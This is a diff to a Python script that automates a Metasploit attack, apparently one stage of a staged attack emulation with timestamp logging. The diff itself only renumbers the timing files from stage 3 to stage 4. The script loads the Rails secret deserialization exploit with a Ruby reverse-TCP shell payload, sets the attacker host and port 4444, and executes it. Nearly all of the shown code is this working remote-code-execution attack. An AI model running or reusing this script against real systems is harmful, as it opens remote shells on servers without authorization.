@@ -20,6 +20,11 @@ def main(argv):
     wipe_disk_folder = "/tmp"
 
     client = MsfRpcClient('kali')
+    
+    # start step 4
+    output_time_file = 'time_stage_4_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
     exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
     payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
@@ -31,19 +36,14 @@ def main(argv):
     payload['LHOST'] = my_ip
     payload['LPORT'] = 4444
 
-    output_time_file = 'time_stage_3_start.txt'
-    record_timestamp(folder, output_time_file)
-    time.sleep(2)
-
     exploit.execute(payload=payload)
 
     while client.jobs.list:
         time.sleep(1)
 
     time.sleep(10)
-    output_time_file = 'time_stage_3_end.txt'
+    output_time_file = 'time_stage_4_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-
 
 main(sys.argv)
